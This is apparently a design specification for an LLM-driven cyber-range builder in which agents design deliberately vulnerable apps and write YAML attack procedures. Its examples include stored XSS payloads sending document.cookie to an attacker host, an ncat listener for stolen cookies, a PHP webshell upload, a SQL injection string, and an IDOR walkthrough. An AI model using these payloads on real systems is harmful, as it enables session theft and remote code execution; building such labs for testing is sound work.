# Game of Everything v2 — Implementation Specification

GoE v2 is a complete rewrite. Scenarios are modeled as a directed graph of typed entities and edges (see [Entity Graph Model](entity_graph_model.md)). This document specifies the build pipeline, testing, and procedure DSL.

---

## Phase 1: Environment Definition

Transforms a user's natural language request into a validated entity graph.

```
[design_systems] → [plan_entities] → [specify_entities] → [connect_edges] → [resolve] → [validate]
     sonnet            sonnet           sonnet (parallel)       sonnet          code         code
```

### Step 0: Design Systems

**Input**: User request (natural language)
**Output**: List of `System` objects with OS, services, network config
**Model**: Sonnet

The LLM determines what infrastructure is needed. For a "web app with database pivot" request, it might produce two systems (webserver + db_server). For a single-box privesc chain, one system.

### Step 1: Plan Entities

**Input**: Systems + user request
**Output**: List of `Entity` stubs (id, description, system_id, rough requires/provides)
**Model**: Sonnet

High-level attack chain planning. Determines what entities exist and their rough relationships. Does NOT specify exact edge types or params yet — that happens in Step 2.

### Step 2: Specify Entities

**Input**: Entity stubs + systems + edge type vocabulary
**Output**: Fully specified entities with typed `requires`/`provides`, `app_spec` where needed
**Model**: Sonnet, parallelized per-entity

Each entity is specified independently (parallelizable) with full knowledge of the edge vocabulary. The LLM assigns exact edge types and structural param names. Entities with custom apps get an `app_spec`.

### Step 3: Connect Edges

**Input**: Specified entities
**Output**: List of `Edge` objects with structural params
**Model**: Sonnet

Wires entities together. Creates edge objects that satisfy every entity's `requires` list and are sourced from another entity's `provides` list (or operator). Ensures the graph is connected and acyclic.

### Step 4: Resolve

**Input**: Complete graph (entities + edges)
**Output**: Graph with structural params filled, hostnames/ports concretized where known at plan time
**Model**: Code (deterministic)

Resolves values that are knowable before building:
- Hostnames (from system definitions)
- Ports (from system service definitions)
- Credential types (from edge type constraints)

Does NOT resolve: file paths, usernames, passwords, tokens — these are set by builders.

### Step 5: Validate

**Input**: Resolved graph
**Output**: Pass/fail + list of violations
**Model**: Code (deterministic)

Runs the 7 static validation checks defined in the Entity Graph Model spec. Zero LLM calls. If validation fails, return to Step 3 with the violation list.

---

## Phase 2: Environment Construction

Builds the validated graph into a working, tested environment.

### Build Ordering

Topological sort of the entity graph produces a build order:

1. Provision systems (install OS packages for declared services — deterministic, no LLM)
2. Build entities in dependency order (entity starts only when all its `requires` edges have concrete values from upstream builders)
3. Entities on different systems with no dependency relationship build in parallel
4. Entities on the same system build sequentially (shared filesystem/services)

### Value Propagation

After each entity's construction_crew completes:

1. Builder reports concrete values for all outgoing edge params
2. System updates those edge objects with concrete values
3. All downstream entities that require those edges now have concrete inputs
4. Next entity in topological order starts building

```
Entity A completes
    → A's builder reports: { path: "/app/.env", user: "www-data" }
    → Edge(A→B).params updated: { path: { structural: "config_file", concrete: "/app/.env" } }
    → Entity B's construction_crew receives concrete values as input
    → Entity B builds
```

---

## Construction Crew (Per-Entity Builder)

Each entity is built by a **construction_crew** — an agentic sub-graph with three roles:

```
                    ┌─────────────────────────────────────────────┐
                    │            construction_crew                 │
                    │                                             │
                    │  [engineer]  →  [developer]  →  [attacker]  │
                    │     opus          sonnet          sonnet     │
                    │                                             │
                    └─────────────────────────────────────────────┘
```

### Engineer (Opus)

**Receives**: Entity spec, resolved incoming edge values, relevant atoms, app_spec (if any)
**Produces**: Architecture plan — what to build, how the vulnerability works, what the exploit path is

For entities with `app_spec`: produces application architecture (routes, DB schema, where the vuln lives, how it's triggered).
For simple misconfigs: produces the config approach (what file to modify, what value to set).

### Developer (Sonnet)

**Receives**: Engineer's plan, entity spec, resolved incoming edge values
**Produces**: Implementation artifacts:
- **With `app_spec`**: Application source files + DB schema/seed if needed
- **Without `app_spec`**: Bash configuration snippet

Also produces: concrete values for all outgoing edge params (what username, what path, what port the app actually uses).

### Attacker (Sonnet)

**Receives**: Developer's artifacts, entity spec, all edge params (including developer's reported concrete values)
**Produces**: Attack procedure (see [Procedure DSL](#procedure-dsl))

The attacker writes a concrete, executable exploit procedure specific to what the developer actually built. This separation means the attacker can be retried independently if the procedure is wrong but the app is correct.

---

## Testing

### Test Flow (Per Entity)

```
                                              ┌─────────────┐
                                         +--->│ PASS        │
                                         |    └─────────────┘
[deploy] → [healthcheck] → [L2 attack] -+
   code        code           executor   |    ┌─────────────┐     ┌────────────────┐
                                         +--->│ L1 diagnose │────>│ targeted retry │
                                              └─────────────┘     └───────┬────────┘
                                                  god-view                 |
                                                                          v
                                                               ┌─────────────────────┐
                                                               │ retry determination │
                                                               └──────────┬──────────┘
                                                                          |
                                                    +----------+----------+----------+
                                                    |                     |          |
                                                    v                     v          v
                                             [fix procedure]    [fix implementation] [re-plan]
                                              attacker only      developer only      full crew
```

### L2 (Attack Probe) — Primary Validation

Execute the attack procedure from the attacker container against the target. If all steps pass their assertions, the entity is validated. This is the only test that matters for correctness.

### L1 (God-View Diagnostic) — Fires Only on L2 Failure

When L2 fails, L1 runs inside the target container with full access (read files, query DBs, inspect process state). Its sole purpose is to produce a diagnostic that tells the retry logic *why* L2 failed:

- "The app is running but the endpoint is `/api/comment` not `/api/reviews`" → procedure bug
- "The app crashed on startup, port 3000 not listening" → implementation bug  
- "SQL injection doesn't work because input is parameterized" → design flaw

### Retry Escalation Ladder

Based on L1 diagnostic:

| Diagnosis | Retry Action | What Runs | Max Attempts |
|-----------|-------------|-----------|--------------|
| Procedure bug (wrong endpoint, wrong payload, wrong assertion) | Fix procedure only | Attacker agent | 2 |
| Implementation bug (crash, wrong behavior, missing dependency) | Fix implementation, re-run attacker | Developer + Attacker | 2 |
| Design flaw (approach fundamentally wrong) | Re-plan from scratch with new info| Full construction_crew | 1 |
| Unknown/ambiguous | Treat as implementation bug | Developer + Attacker | 1 |

Total max attempts per entity: 2 (procedure) + 2 (implementation) + 1 (re-plan) = 5 worst case.

If all attempts exhausted: entity marked `FAILED`. Build continues for independent entities. Dependent entities (those requiring this entity's edges) are marked `SKIPPED` — they cannot receive concrete values from a failed provider.

### Chain Test (Multi-System Only)

Runs after ALL entities individually pass L2:

1. Deploy full topology (all systems, all entities, fresh containers)
2. Execute attack procedures sequentially following topological edge order
3. Each step's concrete output feeds the next (e.g., stolen cookie used in next request)
4. First failure stops the chain — report identifies which edge broke

Chain test failures indicate integration issues (network connectivity, timing, value propagation) not individual entity bugs.

---

## Procedure DSL

The procedure is the contract between the attacker agent and the test executor. It is a structured YAML document with strict schema. Procedures support both raw network actions (HTTP, shell) and persistent browser sessions for multi-step web exploitation.

### Schema

```yaml
sessions:                       # Optional: declare persistent browser sessions
  - id: string                  # Unique session name, snake_case
    type: browser               # Only "browser" for now (extensible to e.g. "ssh")
    base_url: string            # Base URL for relative paths in this session
    auth: SessionAuth | null    # Pre-authentication config (optional)

procedure:
  - step_id: string             # Unique within this procedure, snake_case
    session: string | null      # Session ID (if this step uses a persistent session)
    action: Action              # What to do (see Action Types)
    expect: Assertion | null    # What success looks like (see Assertions)
    outputs: dict | null        # Named values to capture for downstream steps
    timeout: int                # Seconds (default: 10)
```

### Sessions

Sessions are persistent browser contexts (Playwright `BrowserContext`) that maintain cookies, localStorage, and DOM state across multiple steps. Any step referencing a `session` ID operates within that session's browser context.

```python
@dataclass
class SessionAuth:
    login_url: str              # Where to POST login credentials
    username_field: str         # CSS selector or form field name for username input
    password_field: str         # CSS selector or form field name for password input
    username: str               # Value (can use ${} interpolation)
    password: str               # Value (can use ${} interpolation)
    success_indicator: str      # CSS selector or URL pattern that confirms login succeeded
```

If `auth` is provided, the executor automatically logs in before the first step that uses this session. The session stays authenticated for all subsequent steps.

**Multiple sessions**: A procedure can declare multiple sessions (e.g., `attacker_browser` and `victim_browser`) to model attacks that require interleaving actions between different user contexts.

```yaml
sessions:
  - id: attacker_browser
    type: browser
    base_url: "http://${target_host}:${target_port}"

  - id: admin_browser
    type: browser
    base_url: "http://${target_host}:${target_port}"
    auth:
      login_url: "/login"
      username_field: "input[name=username]"
      password_field: "input[name=password]"
      username: "admin"
      password: "${edge.seed_admin_creds.password}"
      success_indicator: ".dashboard"
```

### Action Types

| Action | Context | Fields | Semantics |
|--------|---------|--------|-----------|
| `http_request` | Attacker container | `method`, `url`, `headers`, `body` | Send HTTP request (curl/requests) |
| `exec_attacker` | Attacker container | `command` | Run shell command |
| `exec_target` | Target container | `command` | Run shell command (L1 god-view only) |
| `listen` | Attacker container | `port`, `duration` | Open listener, capture data |
| `sleep` | — | `seconds` | Wait |
| `navigate` | Browser session | `path` | Navigate to URL |
| `click` | Browser session | `selector` | Click an element |
| `fill` | Browser session | `fields` | Fill form fields (without submitting) |
| `fill_and_submit` | Browser session | `fields`, `submit` | Fill form fields and submit |
| `evaluate` | Browser session | `script` | Execute JavaScript in page context |
| `wait_for` | Browser session | `condition` | Wait for a condition to be true |
| `upload` | Browser session | `selector`, `file_content`, `filename` | Upload a file via file input |
| `extract` | Browser session | `selector`, `attribute` | Pull content from DOM |

---

#### Network Actions (No Session Required)

##### `http_request`

```yaml
- step_id: inject_xss
  action:
    type: http_request
    method: POST
    url: "http://${target_host}:${target_port}/api/reviews"
    headers:
      Content-Type: application/json
    body: |
      {"product_id": 1, "text": "<script>fetch('http://${attacker_host}:9999/s?c='+document.cookie)</script>"}
  expect:
    status: 201
  timeout: 10
```

##### `exec_attacker`

```yaml
- step_id: start_listener
  action:
    type: exec_attacker
    command: "ncat -lk 9999 > /tmp/stolen.txt &"
  expect:
    exit_code: 0
  timeout: 5
```

##### `exec_target`

Only valid in L1 (god-view diagnostic). Never appears in L2 procedures.

```yaml
- step_id: check_db_state
  action:
    type: exec_target
    command: "mysql -u root -e 'SELECT * FROM users WHERE admin=1;' myapp"
  expect:
    stdout_contains: "admin"
  timeout: 5
```

##### `listen`

Opens a listener and captures whatever arrives within the duration.

```yaml
- step_id: capture_cookie
  action:
    type: listen
    port: 9999
    duration: 10
  expect:
    received_contains: "session_id="
  outputs:
    stolen_cookie: regex("session_id=([^&\\s]+)")
```

##### `sleep`

```yaml
- step_id: wait_for_cron
  action:
    type: sleep
    seconds: 65
  expect: null
  timeout: 70
```

---

#### Browser Actions (Require Session)

All browser actions require a `session` field referencing a declared session. They execute within that session's persistent browser context (shared cookies, localStorage, page state).

##### `navigate`

Navigate to a path (appended to session's `base_url`).

```yaml
- step_id: go_to_login
  session: attacker_browser
  action:
    type: navigate
    path: "/login"
  expect:
    selector_visible: "form#login-form"
  timeout: 10
```

##### `click`

Click a DOM element by CSS selector.

```yaml
- step_id: click_profile_link
  session: attacker_browser
  action:
    type: click
    selector: "a[href='/profile']"
  expect:
    url_contains: "/profile"
  timeout: 5
```

##### `fill`

Fill form fields without submitting. Useful when you need to fill and then do something else (attach file, click a non-submit button).

```yaml
- step_id: fill_search
  session: attacker_browser
  action:
    type: fill
    fields:
      "input[name=query]": "' OR 1=1 --"
  expect: null
  timeout: 5
```

`fields` is a dict of `CSS selector → value`. Each selector must match exactly one visible input/textarea/select element.

##### `fill_and_submit`

Fill form fields and submit. Submits by clicking the `submit` selector (defaults to the form's submit button if omitted).

```yaml
- step_id: login_as_user
  session: attacker_browser
  action:
    type: fill_and_submit
    fields:
      "input[name=username]": "user1"
      "input[name=password]": "password123"
    submit: "button[type=submit]"    # Optional, defaults to form's submit button
  expect:
    url_contains: "/dashboard"
  timeout: 10
```

##### `evaluate`

Execute arbitrary JavaScript in the page context. Use for complex interactions that don't fit other action types, or for extracting computed state.

```yaml
- step_id: inject_payload_via_dom
  session: attacker_browser
  action:
    type: evaluate
    script: |
      document.querySelector('#comment-box').innerHTML = '<img src=x onerror="fetch(`http://${attacker_host}:9999/`+document.cookie)">';
      document.querySelector('#submit-btn').click();
  expect:
    evaluate_result_contains: null  # No return value assertion needed
  timeout: 10
  outputs:
    page_title: evaluate_return     # If script returns a value
```

For scripts that return a value:
```yaml
- step_id: get_csrf_token
  session: attacker_browser
  action:
    type: evaluate
    script: "return document.querySelector('meta[name=csrf-token]').content;"
  outputs:
    csrf_token: evaluate_return
  timeout: 5
```

##### `wait_for`

Wait for a condition before proceeding. Prevents timing issues in multi-step flows.

```yaml
- step_id: wait_for_page_load
  session: attacker_browser
  action:
    type: wait_for
    condition:
      type: selector          # Wait for element to appear
      value: ".dashboard-loaded"
  timeout: 15
```

Condition types:

| Condition | Value | Meaning |
|-----------|-------|---------|
| `selector` | CSS selector | Element is visible in DOM |
| `url` | URL substring | Current URL contains this string |
| `network_idle` | `null` | No network requests for 500ms |
| `text_visible` | string | Text content is visible on page |

##### `upload`

Upload a file via a file input element. The file content is provided inline (the executor writes it to a temp file and attaches it to the input).

```yaml
- step_id: upload_webshell
  session: attacker_browser
  action:
    type: upload
    selector: "input[type=file]"
    filename: "shell.php.jpg"
    file_content: "<?php system($_GET['cmd']); ?>"
  expect: null
  timeout: 10
```

##### `extract`

Pull content from the DOM for use in subsequent steps.

```yaml
- step_id: get_admin_email
  session: attacker_browser
  action:
    type: extract
    selector: ".user-email"
    attribute: textContent        # "textContent", "innerHTML", "href", "value", or any HTML attribute
  expect:
    extracted_contains: "@"
  outputs:
    admin_email: extracted_value
```

---

### Mixing Browser and Network Actions

Procedures freely mix browser sessions with network actions. This is essential for attacks that combine browser exploitation with out-of-band channels:

```yaml
sessions:
  - id: attacker_browser
    type: browser
    base_url: "http://${target_host}:${target_port}"
  - id: admin_browser
    type: browser
    base_url: "http://${target_host}:${target_port}"
    auth:
      login_url: "/auth/login"
      username_field: "#username"
      password_field: "#password"
      username: "admin"
      password: "admin123"
      success_indicator: "/admin/dashboard"

procedure:
  # 1. Start out-of-band listener
  - step_id: start_listener
    action:
      type: exec_attacker
      command: "ncat -lk 9999 > /tmp/stolen.txt &"
    expect:
      exit_code: 0

  # 2. Attacker registers and injects XSS payload
  - step_id: register_account
    session: attacker_browser
    action:
      type: navigate
      path: "/register"
    expect:
      selector_visible: "form#register"

  - step_id: create_attacker_account
    session: attacker_browser
    action:
      type: fill_and_submit
      fields:
        "#username": "evil_user"
        "#password": "evil_pass"
        "#email": "evil@test.com"
    expect:
      url_contains: "/dashboard"

  - step_id: inject_stored_xss
    session: attacker_browser
    action:
      type: navigate
      path: "/forum/new-post"
    expect:
      selector_visible: "#post-content"

  - step_id: submit_xss_post
    session: attacker_browser
    action:
      type: fill_and_submit
      fields:
        "#post-title": "Help needed"
        "#post-content": "<img src=x onerror=\"fetch('http://${attacker_host}:9999/steal?c='+document.cookie)\">"
    expect:
      url_contains: "/forum/post/"

  # 3. Admin bot visits the forum (triggers XSS in admin context)
  - step_id: admin_visits_forum
    session: admin_browser
    action:
      type: navigate
      path: "/forum"
    expect: null

  - step_id: admin_views_post
    session: admin_browser
    action:
      type: click
      selector: "a:has-text('Help needed')"
    expect: null

  # 4. Wait for XSS to fire and capture cookie
  - step_id: wait_for_exfil
    action:
      type: sleep
      seconds: 3

  - step_id: read_stolen_cookie
    action:
      type: exec_attacker
      command: "cat /tmp/stolen.txt"
    expect:
      stdout_contains: "session_id="
    outputs:
      admin_cookie: regex("session_id=([^&\\s]+)")

  # 5. Use stolen cookie to access admin panel
  - step_id: access_admin_panel
    action:
      type: http_request
      method: GET
      url: "http://${target_host}:${target_port}/admin/dashboard"
      headers:
        Cookie: "session_id=${steps.read_stolen_cookie.admin_cookie}"
    expect:
      all:
        - status: 200
        - body_contains: "Admin Dashboard"
```

---

### Browser Session Lifecycle

| Event | Behavior |
|-------|----------|
| Session declared | Playwright `BrowserContext` created (Chromium, headless) |
| `auth` provided | Executor navigates to `login_url`, fills fields, submits, waits for `success_indicator` |
| Step references session | Action runs in that context's active page |
| `navigate` action | Same page navigates (preserves history, cookies) |
| Multiple sessions active | Each has its own isolated context (separate cookies, storage) |
| Procedure ends | All browser contexts closed |
| Step timeout exceeded | Page screenshot captured for diagnostics, step marked failed |

**Screenshot on failure**: When any browser step fails (assertion fails or timeout), the executor captures a full-page screenshot and attaches it to the diagnostic output. This is critical for debugging — "the button wasn't visible" is much clearer with a screenshot.

### Browser Environment

The attacker container image includes Playwright + Chromium. The executor manages browser lifecycle:

```
goe-attacker image:
  - playwright (Python)
  - chromium (headless)
  - Node.js (for Playwright's browser automation protocol)
```

Browser sessions add ~1-3s startup overhead (first session creation). Subsequent actions within a session are fast (50-500ms per action depending on page complexity).

---

### IDOR / Multi-Step Exploitation Example (Browser-Native)

An entity that exploits an IDOR vulnerability to access another user's data. This requires: login → navigate to own profile → manipulate URL/request to access other user's data.

```yaml
sessions:
  - id: attacker_browser
    type: browser
    base_url: "http://${target_host}:${target_port}"

procedure:
  - step_id: go_to_login
    session: attacker_browser
    action:
      type: navigate
      path: "/login"
    expect:
      selector_visible: "#login-form"

  - step_id: login
    session: attacker_browser
    action:
      type: fill_and_submit
      fields:
        "#username": "user2"
        "#password": "user2pass"
    expect:
      url_contains: "/dashboard"

  - step_id: navigate_own_profile
    session: attacker_browser
    action:
      type: navigate
      path: "/api/users/2/profile"
    expect:
      status: 200
    outputs:
      own_profile: body

  # IDOR: access user 1 (admin) profile by changing the ID
  - step_id: idor_access
    session: attacker_browser
    action:
      type: navigate
      path: "/api/users/1/profile"
    expect:
      all:
        - status: 200
        - body_contains: "admin@"
    outputs:
      admin_email: json(".email")
      admin_phone: json(".phone")

  - step_id: verify_sensitive_data
    session: attacker_browser
    action:
      type: evaluate
      script: "return document.body.innerText;"
    expect:
      evaluate_result_contains: "admin@"
```

---

### Assertions

Each step can have one assertion, an `all` wrapper for multiple, or null for fire-and-forget steps.

#### Network Assertions

| Assertion | Fields | Semantics |
|-----------|--------|-----------|
| `status` | `int` | HTTP status code equals this |
| `exit_code` | `int` | Shell command exit code equals this |
| `stdout_contains` | `string` | stdout includes this substring |
| `stdout_regex` | `string` | stdout matches this regex |
| `received_contains` | `string` | Listen buffer includes this substring |
| `received_regex` | `string` | Listen buffer matches this regex |
| `body_contains` | `string` | HTTP response body includes substring |
| `body_regex` | `string` | HTTP response body matches regex |

#### Browser Assertions

| Assertion | Fields | Semantics |
|-----------|--------|-----------|
| `selector_visible` | CSS selector | Element is visible on page |
| `selector_not_visible` | CSS selector | Element is NOT visible on page |
| `selector_text` | `selector`, `contains` | Element's text content includes substring |
| `selector_count` | `selector`, `count` | Number of matching elements equals count |
| `url_contains` | `string` | Current page URL includes substring |
| `url_equals` | `string` | Current page URL equals exactly |
| `cookie_exists` | `name` | Cookie with this name exists in session |
| `cookie_value` | `name`, `contains` | Cookie value includes substring |
| `localstorage_contains` | `key`, `contains` | localStorage key's value includes substring |
| `evaluate_result_contains` | `string` | JS evaluation return value includes substring |
| `evaluate_result_regex` | `string` | JS evaluation return value matches regex |
| `extracted_contains` | `string` | Extracted DOM content includes substring |
| `extracted_regex` | `string` | Extracted DOM content matches regex |
| `title_contains` | `string` | Page title includes substring |

#### Composite Assertions

Multiple assertions on one step — ALL must pass:

```yaml
expect:
  all:
    - status: 200
    - body_contains: "Admin Dashboard"
    - selector_visible: "#admin-panel"
```

---

### Variable Interpolation

Procedures use `${name}` syntax for:

- **Built-in variables** (always available):
  - `${target_host}` — target container hostname
  - `${attacker_host}` — attacker container hostname
  - `${target_port}` — primary port (from entity's incoming `network_reach` edge)
- **Edge-resolved values** (from incoming edges):
  - `${edge.<edge_id>.<param>}` — concrete value from a resolved edge
  - Example: `${edge.config_to_db_creds.user}` → `"dbadmin"`
- **Step outputs** (from previous steps in this procedure):
  - `${steps.<step_id>.<output_name>}` — captured value
  - Example: `${steps.read_stolen_cookie.admin_cookie}` → `"abc123"`

### Outputs

Steps can capture values for use by later steps:

```yaml
outputs:
  stolen_cookie: regex("session_id=([^&\\s]+)")   # Capture group 1 from relevant buffer
  admin_token: header("Set-Cookie")               # HTTP response header
  file_content: stdout                            # Entire stdout
  page_title: evaluate_return                     # JS evaluation return value
  admin_email: extracted_value                    # DOM extraction result
  user_id: json(".data.id")                       # JSON path from response body
```

Capture sources by action type:

| Action Type | Available Captures |
|-------------|-------------------|
| `http_request` | `regex`, `header`, `body`, `json`, `status_code` |
| `exec_attacker` / `exec_target` | `regex`, `stdout` |
| `listen` | `regex` (from received buffer) |
| `evaluate` | `evaluate_return` |
| `extract` | `extracted_value` |
| `fill_and_submit` / `navigate` | `url` (current URL after action), `cookie` |
| `click` | `url` (current URL after action) |

---

## Runtime Templates

Runtime templates are deterministic — no LLM involvement. The developer outputs app source + port. Templates handle everything else.

```yaml
express:
  base_image: goe-target-express      # Pre-built: Ubuntu 22.04 + Node.js 20
  detect_deps: "grep -oP \"require\\(['\"]\\K[^'\"]+\" ${source} | sort -u"
  setup:
    - "cd /app && npm init -y"
    - "cd /app && npm install ${deps}"
  start:
    systemd: |
      [Unit]
      Description=GoE Express App
      After=network.target
      [Service]
      WorkingDirectory=/app
      ExecStart=/usr/bin/node /app/${source}
      Restart=always
      [Install]
      WantedBy=multi-user.target
    fallback: "cd /app && nohup node ${source} &"
  healthcheck: "curl -sf http://localhost:${port}/ || curl -sf http://localhost:${port}/health"

flask:
  base_image: goe-target-flask        # Pre-built: Ubuntu 22.04 + Python 3 + pip
  detect_deps: "grep -oP '^(?:from|import) \\K[a-zA-Z_]+' ${source} | sort -u"
  setup:
    - "cd /app && pip install ${deps}"
  start:
    systemd: |
      [Unit]
      Description=GoE Flask App
      After=network.target
      [Service]
      WorkingDirectory=/app
      ExecStart=/usr/bin/python3 /app/${source}
      Restart=always
      [Install]
      WantedBy=multi-user.target
    fallback: "cd /app && nohup python3 ${source} &"
  healthcheck: "curl -sf http://localhost:${port}/"

apache_php:
  base_image: goe-target-php          # Pre-built: Ubuntu 22.04 + Apache 2 + PHP
  detect_deps: null                   # PHP deps handled by apt in base image
  setup:
    - "cp ${source} /var/www/html/"
    - "chown www-data:www-data /var/www/html/${source}"
  start:
    systemd: "systemctl restart apache2"
    fallback: "apachectl start"
  healthcheck: "curl -sf http://localhost:${port}/"
```

### Multi-File Apps

If the developer produces multiple files, they are provided as a manifest:

```python
@dataclass
class BuildArtifact:
    source_files: dict[str, str]    # filename → content
    primary_source: str             # Entry point filename
    port: int                       # Port the app listens on
    db_setup: DBSetup | None        # Schema + seed SQL if needed
    extra_deps: list[str]           # Deps not detectable from source (e.g., puppeteer)
```

```python
@dataclass
class DBSetup:
    db_type: str                    # "mysql" | "postgresql"
    schema_sql: str                 # Table definitions
    seed_sql: str                   # Initial data (admin users, test content)
```

The runtime template copies all `source_files` to `/app/`, runs dependency detection on `primary_source`, and starts the primary source as the entry point.

---

## Failure Propagation

| Scenario | Behavior |
|----------|----------|
| Entity A fails all retries | A marked `FAILED` |
| Entity B requires edge from A | B marked `SKIPPED` (cannot build without A's concrete values) |
| Entity C has no dependency on A | C builds normally |
| Chain test with any `FAILED`/`SKIPPED` entity | Chain test skipped, final report lists broken path |
| All entities pass but chain test fails | Report which edge broke, no per-entity retry |

### Final Report

```yaml
build_report:
  entities:
    - id: vuln_webapp
      status: PASSED
      attempts: 1
    - id: admin_panel_rce
      status: PASSED
      attempts: 3  # 1 procedure fix + 1 implementation fix
    - id: db_creds_in_config
      status: FAILED
      attempts: 5
      failure_reason: "design flaw — atom requires MySQL but system only has PostgreSQL"
    - id: ssh_reuse
      status: SKIPPED
      reason: "depends on failed entity db_creds_in_config"
  chain_test:
    status: SKIPPED
    reason: "incomplete graph — 1 entity failed"
  output:
    deploy_scripts: [webserver_deploy.sh]  # Only passing entities included
    attack_playbook: playbook.yaml         # Only passing entity procedures
    topology: docker-compose.yml
```

---

## Final Packaging

Once all entities validated (and chain test passes if multi-system):

### Single System
- Concatenate deploy snippets in topological order → one `deploy.sh`
- Post-processing: shebang injection, `set -e`, blank line normalization

### Multi-System
- Per-system `deploy_<system_id>.sh`
- `docker-compose.yml` defining network topology
- Post-processing per script

### Output Package Contents
- Deploy script(s)
- `playbook.yaml` — ordered attack procedures for all entities (operator walkthrough)
- `README.md` — topology summary, entity descriptions, attack chain overview
- `report.yaml` — build report with attempt counts, any failures

---

## Cost Model (Estimated)

Per entity:
- Engineer (Opus): ~$0.10-0.30 (one call, plan output)
- Developer (Sonnet): ~$0.03-0.10 (one call, code output)  
- Attacker (Sonnet): ~$0.03-0.08 (one call, procedure output)
- L2 test execution: ~$0.00 (deterministic, no LLM)
- L1 diagnostic (if needed): ~$0.02-0.05 (one Sonnet call to interpret)
- Retry (procedure fix): ~$0.03-0.08 per attempt
- Retry (implementation fix): ~$0.06-0.18 per attempt
- Retry (full re-plan): ~$0.16-0.48

Planning overhead (fixed per scenario):
- Steps 0-3: ~$0.15-0.40 (4 Sonnet calls)
- Steps 4-5: ~$0.00 (deterministic)

**Typical 4-entity scenario**: $0.80-1.50 (no retries) to $2.00-3.50 (heavy retries)
**Compared to v1**: Similar cost for simple scenarios, potentially cheaper for complex ones due to targeted retries instead of full regeneration.
